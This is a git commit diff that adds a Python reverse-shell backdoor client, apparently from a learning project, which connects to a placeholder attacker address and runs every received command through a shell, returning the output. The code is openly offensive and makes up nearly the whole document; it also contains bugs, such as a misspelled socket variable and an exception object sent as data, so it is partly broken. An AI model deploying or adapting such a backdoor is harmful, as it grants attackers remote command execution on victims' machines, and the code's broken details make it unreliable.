66839f61e9861769a055ac6f7a1c7185af0b30f4
V1ZEI-CN <vijaychowdary3699@gmail.com>
2021-12-16 17:05:04 +0530

    listener + client program in backdoor

--- backdoor/reverseBackdoor.py
+++ backdoor/reverseBackdoor.py
@@ -3,9 +3,35 @@
 
 # ------------------------------- start of code -----------------------------
 
+import sys
 import socket
+import subprocess
+
+def execute_system_commands(command):
+  return subprocess.check_output(command, shell=True)
 
 # to create a socket we need to ceate an instance of it first
 connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # this socket method takes two arguments, 1st the address family(read about it), 2nd is socket type
 # in general if the connection is tcp connection then the type is sock_stream
+
+connection.connect(("<IP>", PORT_NUMBER))
+
+# this send method requires data to be sent in bytes format
+connetion.send("[+] Connection Success.\n".encode('utf-8'))
+
+while True:
+  try:
+    # the argument is the amount of buffer size to store the data
+    data_received = connetion.recv(1024).decode('utf-8')
+    command_result = execute_system_commands(data_received)
+    connetion.send(command_result)
+  except subprocess.CalledProcessError as error:
+    connetion.send(error)
+    sys.exit()
+  except KeyboardInterrupt as error:
+    data = "\r[+] Keyboard Interrpution, quitting the program\n"
+    connetion.send(data.encode('utf-8'))
+    sys.exit()
+
+connetion.close()
